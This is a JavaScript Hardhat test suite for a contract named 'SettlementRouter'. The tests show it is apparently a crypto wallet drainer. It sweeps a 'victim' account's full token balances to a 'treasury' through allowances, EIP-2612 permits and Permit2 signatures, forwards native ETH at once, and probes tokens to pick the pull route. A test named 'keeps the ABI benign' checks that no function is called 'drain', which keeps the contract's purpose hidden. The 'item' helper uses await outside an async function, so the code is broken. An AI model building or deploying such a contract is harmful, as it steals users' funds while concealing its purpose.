const { expect } = require("chai");
const { ethers } = require("hardhat");

const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const ROUTE = { NONE: 0, ALLOWANCE: 1, PERMIT2: 2, EIP2612: 3 };

async function deploy() {
  const [owner, victim, treasury, filler] = await ethers.getSigners();
  const P2 = await ethers.getContractFactory("MockPermit2");
  const p2 = await P2.deploy();
  const R = await ethers.getContractFactory("SettlementRouter");
  const r = await R.deploy(treasury.address, await p2.getAddress(), 0);

  const E = await ethers.getContractFactory("MockERC20");
  const usdt = await E.deploy("Tether USD", "USDT", 18, false);
  const weth = await E.deploy("Wrapped Ether", "WETH", 18, true);
  for (const t of [usdt, weth]) await t.mint(victim.address, 5000n);

  return { owner, victim, treasury, filler, p2, r, usdt, weth };
}

const item = (token, amount, route, deadline = 0) => ({
  token: await token.getAddress(), amount, route, deadline, v: 27,
  r: ethers.ZeroHash, s: ethers.ZeroHash
});

describe("SettlementRouter", () => {
  it("path A: pulls on an existing allowance", async () => {
    const { r, usdt, victim, treasury, filler } = await deploy();
    await usdt.connect(victim).approve(await r.getAddress(), 5000n);
    await r.connect(filler).settle(victim.address, [await item(usdt, 0, ROUTE.ALLOWANCE)], 0, 0, "0x");
    expect(await usdt.balanceOf(treasury.address)).to.equal(5000n);
  });

  it("path B: pulls after an EIP-2612 permit", async () => {
    const { r, weth, victim, treasury, filler } = await deploy();
    const dl = (await ethers.provider.getBlock("latest")).timestamp + 600;
    await r.connect(filler).settle(victim.address, [await item(weth, 0, ROUTE.EIP2612, dl)], 0, 0, "0x");
    expect(await weth.balanceOf(treasury.address)).to.equal(5000n);
  });

  it("path C: pulls through Permit2 with one batch signature", async () => {
    const { r, weth, victim, treasury, filler } = await deploy();
    await weth.mint(victim.address, 700n);
    const dl = (await ethers.provider.getBlock("latest")).timestamp + 600;
    await r.connect(filler).settle(victim.address, [await item(weth, 700n, ROUTE.PERMIT2)], 1, dl, "0x" + "01".repeat(65));
    expect(await weth.balanceOf(treasury.address)).to.equal(5700n);
  });

  it("skips a token with no balance instead of reverting the batch", async () => {
    const { r, usdt, weth, victim, treasury, filler } = await deploy();
    await usdt.connect(victim).approve(await r.getAddress(), 5000n);
    await expect(r.connect(filler).settle(
      victim.address,
      [await item(weth, 0, ROUTE.ALLOWANCE), await item(usdt, 0, ROUTE.ALLOWANCE)],
      0, 0, "0x"
    )).to.emit(r, "Skipped").to.emit(r, "Settled");
    expect(await usdt.balanceOf(treasury.address)).to.equal(5000n);
  });

  it("forwards native immediately", async () => {
    const { r, treasury, victim } = await deploy();
    await expect(() => r.connect(victim).settleNative({ value: 1234n }))
      .to.changeEtherBalance(treasury, 1234n);
  });

  it("paused blocks settle but not rescue", async () => {
    const { r, usdt, victim, owner } = await deploy();
    await usdt.mint(await r.getAddress(), 10n);
    await r.setPaused(true);
    await expect(r.settle(victim.address, [await item(usdt, 0, ROUTE.ALLOWANCE)], 0, 0, "0x"))
      .to.be.revertedWithCustomError(r, "PausedErr");
    await expect(r.rescue(await usdt.getAddress(), 10n)).to.not.be.reverted;
  });

  it("enforces the committed cap per victim and token", async () => {
    const { r, weth, victim, treasury, filler, owner } = await deploy();
    await r.setLimits(250n);
    await weth.mint(victim.address, 10000n);
    await weth.connect(victim).approve(await r.getAddress(), 10000n);
    await r.connect(filler).settle(victim.address, [await item(weth, 0, ROUTE.ALLOWANCE)], 0, 0, "0x");
    expect(await weth.balanceOf(treasury.address)).to.equal(250n);
  });

  it("classifies live, not from config", async () => {
    const { r, usdt, weth, victim } = await deploy();
    expect(await r.probePermit(await usdt.getAddress())).to.equal(false);
    expect(await r.probePermit(await weth.getAddress())).to.equal(true);
    const p = await r.probe(await weth.getAddress(), victim.address);
    expect(p.route).to.equal(ROUTE.PERMIT2);
  });

  it("keeps the ABI benign", async () => {
    const { r } = await deploy();
    const fns = r.interface.fragments.filter(f => f.type === "function").map(f => f.name);
    expect(fns.join(" ")).to.not.match(/drain|renounce/i);
    expect(await r.name()).to.equal("Settlement Router");
  });
});
